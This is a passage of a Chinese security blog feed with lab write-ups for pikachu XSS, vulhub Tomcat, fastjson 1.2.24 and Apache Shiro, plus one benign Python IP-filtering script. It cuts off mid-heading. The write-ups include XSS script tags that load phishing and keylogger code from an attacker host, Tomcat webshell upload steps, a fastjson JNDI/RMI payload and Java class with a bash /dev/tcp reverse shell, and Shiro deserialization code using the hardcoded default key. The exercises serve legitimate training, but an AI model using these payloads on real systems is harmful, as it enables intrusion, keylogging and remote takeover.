alt="image-20240329171826373"></p><p>打开xss钓鱼后台，打开存储型xss，输入</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;http://192.168.174.142:8080/pkxss/xfish/fish.php&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.174.142:8080/pkxss/xfish/fish.php&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>页面会出现弹窗，输入账号密码。当页面刷新时依然存在弹窗，所有访问者都会遇到弹窗，输入账号密码后，数据被存入后台，打开xss后台即可查看钓鱼数据。<br><img src="/../image/image-20240329182644000-1723344400345-275.png" alt="image-20240329182644000"></p><p>之前源文件多了个空格，一直没信息过来。。。</p><h2 id="2-12XSS获取键盘记录"><a href="#2-12XSS获取键盘记录" class="headerlink" title="2.12XSS获取键盘记录"></a>2.12XSS获取键盘记录</h2><p>当协议、主机(主域名，子域名)、端口中的任意一一个不相同时，称为不同域。我们把不同的域之间请求数据的操作，成为跨域操作。<br>跨域同源策略<br>了安全考虑，所有的浏览器都约定了”同源策略”， 同源策略规定，两个不同域名之间不能使用JS进行相互操作。比如: x.com域名下的javascrip并不能操作y.com域下的对象。<br>如果想要跨域操作,则需要管理员进行特殊的配置。<br>比如通过: header( “Access -Control Allow- Origin:x.com” )指定。<br>Tips:下面这些标签跨域加载资源(资源类型是有限制的)是不受同源策略限制的。</p><pre><code>版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。</code></pre><p>原文链接：<a href="https://blog.csdn.net/qq_53571321/article/details/121692906">https://blog.csdn.net/qq_53571321/article/details/121692906</a></p><p>先修改下rk.js和rkserver文件</p><p><img src="/../image/image-20240329185222678-1723344400346-276.png" alt="image-20240329185222678"></p><p><img src="/../image/image-20240329185437072-1723344400346-278.png" alt="image-20240329185437072"></p><p>在pikachu存储型xss模块进行键盘记录的实验演示：<br>在存储型xss漏洞模块输入</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;http://192.168.174.142:8080/pkxss/rkeypress/rk.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>此时这段JavaScript就被嵌入到了页面中，此时在网页上输入的键盘就会被存储到攻击者的后台</p><p><img src="/../image/image-20240329191616017-1723344400346-277.png" alt="image-20240329191616017"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场练习 </tag>
            
            <tag> pikachu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulhub-tomcat</title>
      <link href="/2024/08/11/vulhub-tomcat/"/>
      <url>/2024/08/11/vulhub-tomcat/</url>
      
        <content type="html"><![CDATA[<h1 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h1><p>Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。其中，欲访问后台，需要对应用户有相应权限。</p><p>Tomcat7+权限分为：</p><ul><li>manager（后台管理）<ul><li>manager-gui 拥有html页面权限</li><li>manager-status 拥有查看status的权限</li><li>manager-script 拥有text接口的权限，和status权限</li><li>manager-jmx 拥有jmx权限，和status权限</li></ul></li><li>host-manager（虚拟主机管理）<ul><li>admin-gui 拥有html页面权限</li><li>admin-script 拥有text接口权限</li></ul></li></ul><p><img src="/../image/image-20240718152527445-1723344287772-26.png" alt="image-20240718152527445"></p><p><img src="/../image/image-20240718152550238-1723344287768-23.png" alt="image-20240718152550238"></p><p> 找到登录页面之后尝试tomcat的弱口令，tomcat+tomcat成功登录。</p><p> 之后就发现可以进行上传文件的操作</p><p><img src="/../image/image-20240718152630257-1723344287767-21.png" alt="image-20240718152630257"></p><p>上传war包getshell，上传完成之后就可以看到多了一栏数据，war包就是把码天骄到压缩包，改后缀再上传</p><p><img src="/../image/image-20240718153257830-1723344287772-25.png" alt="image-20240718153257830"></p><p><img src="/../image/image-20240718153437202-1723344287767-22.png" alt="image-20240718153437202"></p><p>也是成功访问，用冰蝎连接试试</p><p><img src="/../image/image-20240718153649051-1723344287772-29.png" alt="image-20240718153649051"></p><h1 id="CVE-2017-12615：PUT方法任意写文件漏洞"><a href="#CVE-2017-12615：PUT方法任意写文件漏洞" class="headerlink" title="CVE-2017-12615：PUT方法任意写文件漏洞"></a>CVE-2017-12615：PUT方法任意写文件漏洞</h1><ol><li>访问主页</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.16.14.148:8080</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240718151205060-1723344287772-32.png" alt="image-20240718151205060"></p><p>2.抓包</p><p><img src="/../image/image-20240718151223790-1723344287772-24.png" alt="image-20240718151223790"></p><p>3.修改方法</p><p>在上传文件的时候需要对文件后缀名进行修改绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">org.apache.jasper.servlet.JspServlet：默认处理jsp，jspx文件请求，不存在PUT上传逻辑，无法处理PUT请求</span><br><span class="line">org.apache.catalina.servlets.DefaultServlet：默认处理静态文件（除jsp，jspx之外的文件），存在PUT上传处理逻辑，可以处理PUT请求。</span><br><span class="line">所以我们即使可以PUT一个文件到服务器但也无法直接PUT以jsp,jspx结尾文件，因为这些这些后缀的文件都是交由JspServlet处理的，它没法处理PUT请求。</span><br></pre></td></tr></table></figure><p>但是当我们利用Windows特性以下面两种方式上传文件时，tomcat并不认为其是jsp文件从而交由DefaultServlet处理，从而成功创建jsp文件，这也就是所谓的CVE-2017-12615漏洞。</p><p>给文件后缀加一个 “ &#x2F; ” ,变为 myshell.jsp&#x2F;,这个&#x2F;很关键</p><p><img src="/../image/image-20240718151321666-1723344287772-27.png" alt="image-20240718151321666"></p><p>4.冰蝎连接</p><p><img src="/../image/image-20240718151718092-1723344287772-28.png" alt="image-20240718151718092"></p><h1 id="CVE-2020-1938：文件包含"><a href="#CVE-2020-1938：文件包含" class="headerlink" title="CVE-2020-1938：文件包含"></a><a href="https://so.csdn.net/so/search?q=CVE&spm=1001.2101.3001.7020">CVE</a>-2020-1938：文件包含</h1><p>由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。</p><p>tomcat 配置了两个Connecto，它们分别是 HTTP 和 AJP ：HTTP默认端口为8080，处理http请求，而AJP默认端口8009，用于处理 AJP 协议的请求，而AJP比http更加优化，多用于反向、集群等，漏洞由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件以及可以包含任意文件，如果有某上传点，上传图片马等等，即可以获取shell。</p><p>环境启动之后，进行端口扫描，查看8009端口是否处于开放状态</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -p- 192.168.174.137</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240726180058968-1723344287772-30.png" alt="image-20240726180058968"></p><p>从Github克隆POC脚本到本地:</p><p><a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a></p><p><img src="/../image/image-20240726193752818-1723344287772-31.png" alt="image-20240726193752818"></p>]]></content>
      
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulhub-fastjson</title>
      <link href="/2024/08/11/vulhub-fastjson/"/>
      <url>/2024/08/11/vulhub-fastjson/</url>
      
        <content type="html"><![CDATA[<h1 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h1><p>原理：<a href="https://blog.csdn.net/Bossfrank/article/details/130100893+">https://blog.csdn.net/Bossfrank/article/details/130100893+</a></p><p><a href="https://www.freebuf.com/vuls/208339.html">https://www.freebuf.com/vuls/208339.html</a></p><p>RMi：<a href="https://blog.csdn.net/cj_eryue/article/details/134283846">https://blog.csdn.net/cj_eryue/article/details/134283846</a></p><p>靶机：192.168.174.137</p><p>攻击机:192.168.174.160</p><h2 id="1-2-24-rce"><a href="#1-2-24-rce" class="headerlink" title="1.2.24-rce"></a>1.2.24-rce</h2><p>访问靶机8090端口，查看服务</p><p><img src="/../image/image-20240726204004493-1723344210785-4.png" alt="image-20240726204004493"></p><p>可以看到成功访问</p><h3 id="1-远程创建文件"><a href="#1-远程创建文件" class="headerlink" title="1.远程创建文件"></a>1.远程创建文件</h3><p>在攻击机上创建一个TouchFile.java文件</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// javac TouchFile.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TouchFile</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;touch&quot;</span>, <span class="string">&quot;/tmp/success&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译.java文件，生成.class文件。<strong>特别注意：要保证java和javac的版本一致，且都是1.8的版本</strong>再用python搭建一个简易服务器</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m http.server 9966</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240726225243350-1723344210785-2.png" alt="image-20240726225243350"></p><p>接下来使用marshalsec项目，启动RMI服务，监听9999端口并加载远程类TouchFile.class：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar  marshalsec.jndi.RMIRefServer &quot;http://192.168.174.160:9966/#TouchFile&quot; 9999</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240726231034594-1723344210785-3.png" alt="image-20240726231034594"></p><p>刷新靶场(<a href="http://192.168.174.137:8090)的链接，抓包后改GET包为POST包（右键-&gt;变更请求方法），然后在发送的请求数据包中输入以下payload：">http://192.168.174.137:8090)的链接，抓包后改GET包为POST包（右键-&gt;变更请求方法），然后在发送的请求数据包中输入以下payload：</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 169</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">&#123;</span><br><span class="line">  &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://192.168.174.160:9999/TouchFile&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240726231428714-1723344210784-1.png" alt="image-20240726231428714"></p><p>返回500就算成功了，也可以看下rmi监听的信息和http服务器的信息</p><p><img src="/../image/image-20240726231522006-1723344210785-7.png" alt="image-20240726231522006"></p><p><img src="/../image/image-20240726231533481-1723344210785-6.png" alt="image-20240726231533481"></p><p>还可以去容器里看看有没有创建文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec -it 容器id bash</span><br></pre></td></tr></table></figure><p>好像没有，但切换到靶机里就可以了</p><p><img src="/../image/image-20240726232517434-1723344210785-5.png" alt="image-20240726232517434"></p><p><img src="/../image/image-20240726232623558-1723344210785-8.png" alt="image-20240726232623558"></p><p>应该是容器网络没配置好</p><h3 id="2-反弹shell"><a href="#2-反弹shell" class="headerlink" title="2.反弹shell"></a>2.反弹shell</h3><p>基本思路和前面是一模一样的，改一下恶意站点的java代码就行了。在vulhub下的fastjson 1.2.24文件夹下保存以下代码为GetShell.java文件:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// javac GetShell.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.174.160/8888 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后抓包，把TouchFile改成Shell即可</p><p><img src="/../image/image-20240726233239723-1723344210785-9.png" alt="image-20240726233239723"></p><p><img src="/../image/image-20240726233205520-1723344210785-10.png" alt="image-20240726233205520"></p><p>奇怪shell怎么反弹的回来</p>]]></content>
      
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ip练习-python</title>
      <link href="/2024/08/10/ip%E7%BB%83%E4%B9%A0-python/"/>
      <url>/2024/08/10/ip%E7%BB%83%E4%B9%A0-python/</url>
      
        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=&#x27;utf-8&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">https://blog.51cto.com/u_16213398/9007087</span></span><br><span class="line"><span class="string">https://docs.python.org/zh-cn/3/howto/ipaddress.html#ipaddress-howto</span></span><br><span class="line"><span class="string">https://blog.csdn.net/u013541325/article/details/117530957</span></span><br><span class="line"><span class="string">https://www.cnblogs.com/itsfei/p/17445303.html</span></span><br><span class="line"><span class="string">https://mwell.tech/archives/9630#:~:text=%E4%BD%BF%E7%94%A8%20ipaddress%20%E6%A8%A1%E5%9D%97%E5%A4%84%E7%90%86%20IP%20%E7%BD%91%E7%BB%9C%201%201.%20%E6%A3%80%E6%9F%A5IP%E5%9C%B0%E5%9D%80%E6%98%AFIPv4%E8%BF%98%E6%98%AFIPv6,true%E3%80%82%20...%208%208.%20%E4%BD%BF%E7%94%A8%20IPv4Interface%20%E5%AF%B9%E8%B1%A1%20</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> ipaddress</span><br><span class="line"><span class="comment"># 保留ipv4地址(正则法)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;def check_ip(ipAddr):</span></span><br><span class="line"><span class="string">    compile_ip=re.compile(&#x27;^(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|[1-9])\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d)\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d)\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d)$&#x27;)</span></span><br><span class="line"><span class="string">    if compile_ip.match(ipAddr):</span></span><br><span class="line"><span class="string">        return True</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        return False&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_ipv4</span>(<span class="params">ipAddr</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ipaddress.IPv4Address(ipAddr)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> ipaddress.AddressValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="comment"># 去除内网地址(ip):</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;def is_private_ip(ipArrd):</span></span><br><span class="line"><span class="string">    subnet = &#123;</span></span><br><span class="line"><span class="string">        &quot;10.0.0.0/8&quot;,</span></span><br><span class="line"><span class="string">        &quot;172.16.0.0/12&quot;,</span></span><br><span class="line"><span class="string">        &quot;192.168.0.0/16&quot;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    ip = ipaddress.ip_address(ipArrd)</span></span><br><span class="line"><span class="string">    try:</span></span><br><span class="line"><span class="string">        for lan in subnet:</span></span><br><span class="line"><span class="string">            if ip in ipaddress.ip_network(lan):</span></span><br><span class="line"><span class="string">                return True</span></span><br><span class="line"><span class="string">        return False</span></span><br><span class="line"><span class="string">    except ipaddress.AddressValueError:</span></span><br><span class="line"><span class="string">        return &quot;error！！！&quot;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;ip.txt&quot;</span>,<span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ip_list = f.read()</span><br><span class="line"><span class="comment">#去除杂七杂八的</span></span><br><span class="line">parttern1 = re.<span class="built_in">compile</span>(<span class="string">&#x27;IOC：|ioc：|XFF：|&quot;|”|XFF代理：&#x27;</span>)</span><br><span class="line">data = re.sub(parttern1,<span class="string">&quot;&quot;</span>,ip_list)</span><br><span class="line"><span class="comment">#分割成多行</span></span><br><span class="line">parttern2=re.<span class="built_in">compile</span>(<span class="string">&#x27;,|，|、&#x27;</span>)</span><br><span class="line">data = re.sub(parttern2,<span class="string">&#x27;\n&#x27;</span>,data) <span class="comment">#re.sub返回的是新的列表</span></span><br><span class="line"><span class="comment">#存为列表</span></span><br><span class="line">ip_list = data.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="comment">#去除空格</span></span><br><span class="line">ip_list = [x.strip() <span class="keyword">for</span> x <span class="keyword">in</span> ip_list <span class="keyword">if</span> x.strip() != <span class="string">&#x27;&#x27;</span>]</span><br><span class="line"><span class="comment">#去除端口号</span></span><br><span class="line">final_list = [re.findall(<span class="string">r&#x27;\d+\.\d+\.\d+\.\d+&#x27;</span>, x)[<span class="number">0</span>] <span class="keyword">if</span> <span class="string">&quot;:&quot;</span> <span class="keyword">in</span> x <span class="keyword">else</span> x  <span class="keyword">for</span> x <span class="keyword">in</span> ip_list]</span><br><span class="line"><span class="comment">#保留ipv4地址</span></span><br><span class="line">final_list = [x <span class="keyword">for</span> x <span class="keyword">in</span> final_list <span class="keyword">if</span> is_ipv4(x) == <span class="literal">True</span>]</span><br><span class="line"><span class="comment">#去除内网地址</span></span><br><span class="line">final_list = [x <span class="keyword">for</span> x <span class="keyword">in</span> final_list <span class="keyword">if</span> ipaddress.ip_address(x).is_private == <span class="literal">False</span>]</span><br><span class="line"><span class="comment">#打印测试</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> final_list:</span><br><span class="line">        f.write(i + <span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure><p>dns判断有个反向思考的方法，利用nslookup可以尝试，后续补充</p><p>分隔ip</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ip.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">data = f.read()</span><br><span class="line"><span class="comment">#print(str(data[0:31]))</span></span><br><span class="line">data = data.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">data = data.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="comment">#print(data)</span></span><br><span class="line"><span class="comment">#with open(&#x27;分隔01.txt&#x27;,&#x27;w&#x27;) as f:</span></span><br><span class="line"><span class="comment">#for i in data:</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;分隔01.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(data),<span class="number">31</span>):</span><br><span class="line">line = <span class="string">&#x27;,&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>,data[i:i+<span class="number">32</span>]))</span><br><span class="line"><span class="comment">#print(len(line.split(&quot;,&quot;)))</span></span><br><span class="line"><span class="comment">#print(line)</span></span><br><span class="line">f.write(line + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(len(line.split(&quot;,&quot;)))</span></span><br><span class="line"><span class="comment">#print(line)</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub-shiro</title>
      <link href="/2024/08/09/vulnhub-shiro/"/>
      <url>/2024/08/09/vulnhub-shiro/</url>
      
        <content type="html"><![CDATA[<p><strong>超级详细：</strong><a href="https://xz.aliyun.com/t/11633#toc-2">https://xz.aliyun.com/t/11633#toc-2</a> # 好文</p><h1 id="什么是Shiro"><a href="#什么是Shiro" class="headerlink" title="什么是Shiro"></a>什么是Shiro</h1><p><a href="https://so.csdn.net/so/search?q=Apache&spm=1001.2101.3001.7020">Apache</a> Shiro 是Java 的一个安全框架。Shiro 可以非常容易的开发出足够好的应用，其不仅可以用在JavaSE 环境，也可以用在JavaEE 环境。Shiro 可以帮助我们完成：认证、授权、加密、会话管理、与Web 集成、缓存等。</p><h1 id="CVE-2010-3863：权限绕过"><a href="#CVE-2010-3863：权限绕过" class="headerlink" title="CVE-2010-3863：权限绕过"></a>CVE-2010-3863：权限绕过</h1><p>Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。</p><p>在Apache Shiro 1.1.0以前的版本中，shiro 进行权限验证前未对url 做标准化处理，攻击者可以构造<code>/</code>、<code>//</code>、<code>/./</code>、<code>/../</code> 等绕过权限验证</p><p>参考链接：</p><ul><li><a href="https://github.com/apache/shiro/commit/ab8294940a19743583d91f0c7e29b405d197cc34">https://github.com/apache/shiro/commit/ab8294940a19743583d91f0c7e29b405d197cc34</a></li><li><a href="https://xz.aliyun.com/t/11633#toc-2">https://xz.aliyun.com/t/11633#toc-2</a> # 好文</li><li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3863">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3863</a></li></ul><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>执行如下命令启动一个搭载Shiro 1.0.0的应用：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure><p>环境启动后，访问<code>http://your-ip:8080</code>即可查看首页。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>直接请求管理页面<code>/admin</code>，无法访问，将会被重定向到登录页面：</p><p><img src="/../image/image-20240809142903369.png" alt="image-20240809142903369"></p><p>构造恶意请求<code>/./admin</code>，即可绕过权限校验，访问到管理页面：</p><p><img src="/../image/image-20240809142935850.png" alt="image-20240809142935850"></p><h1 id="CVE-2016-4437：反序列"><a href="#CVE-2016-4437：反序列" class="headerlink" title="CVE-2016-4437：反序列"></a>CVE-2016-4437：反序列</h1><p>Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。</p><p>在Apache shiro的框架中，执行身份验证时提供了一个记住密码的功能（RememberMe），如果用户登录时勾选了这个选项。用户的请求数据包中将会在cookie字段多出一段数据，这一段数据包含了用户的身份信息，且是经过加密的。加密的过程是：用户信息&#x3D;&gt;序列化&#x3D;&gt;AES加密（这一步需要用密钥key）&#x3D;&gt;base64编码&#x3D;&gt;添加到RememberMe Cookie字段。勾选记住密码之后，下次登录时，服务端会根据客户端请求包中的cookie值进行身份验证，无需登录即可访问。那么显然，服务端进行对cookie进行验证的步骤就是：取出请求包中rememberMe的cookie值 &#x3D;&gt; Base64解码&#x3D;&gt;AES解密（用到密钥key）&#x3D;&gt;反序列化。</p><p>原文链接：<a href="https://blog.csdn.net/Bossfrank/article/details/130173880">https://blog.csdn.net/Bossfrank/article/details/130173880</a></p><p><img src="/../image/image-20240810215154346.png" alt="image-20240810215154346"></p><p><strong>如果出现rememberMe&#x3D;deleteMe字段应该是仅仅能说明登录页面采用了shiro进行了身份验证而已，并非直接就说明存在漏洞</strong>。下面这篇博客写的也比较细，其漏洞验证流程也类似判断请求和响应包的字段，如下图：</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/16f8a0848662770f66e061efa5730a5b.png" alt="img"></p><p><a href="https://blog.csdn.net/dreamthe/article/details/124390531">https://blog.csdn.net/dreamthe/article/details/124390531</a></p><p>对于shiro550，其漏洞的核心成因是cookie中的身份信息进行了AES加解密，用于加解密的密钥应该是绝对保密的，但在shiro版本&lt;&#x3D;1.2.24的版本中使用了固定的密钥。因此，验证漏洞的核心应该还是在于我们（攻击者）可否获得这个AES加密的密钥，如果确实是固定的密钥kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;或者其他我们可以通过脚本工具爆破出来的密钥，那么shiro550漏洞才一定存在。<br><img src="/../image/image-20240810220221463.png" alt="image-20240810220221463"></p><p>说明漏洞存在</p><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>执行如下命令启动一个使用了Apache Shiro 1.2.4的Web服务：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure><p>服务启动后，访问<code>http://your-ip:8080</code>可使用<code>admin:vulhub</code>进行登录。</p><h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>使用ysoserial生成CommonsBeanutils1的Gadget：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-all.jar CommonsBeanutils1 &quot;touch /tmp/success&quot; &gt; poc.se</span><br></pre></td></tr></table></figure><p>使用Shiro内置的默认密钥对Payload进行加密：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vulhub.shirodemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.CodecSupport;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.codec.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.io.DefaultSerializer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.file.FileSystems;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestRemember</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath(<span class="string">&quot;/path&quot;</span>, <span class="string">&quot;to&quot;</span>, <span class="string">&quot;poc.ser&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">byte</span>[] key = Base64.decode(CodecSupport.toBytes(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(payloads, key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里不会配环境，就先用工具测试一下，去补一下环境搭建</p><p><img src="/../image/image-20240811102311688.png" alt="image-20240811102311688"></p><h3 id="构造cookie获取反弹shell"><a href="#构造cookie获取反弹shell" class="headerlink" 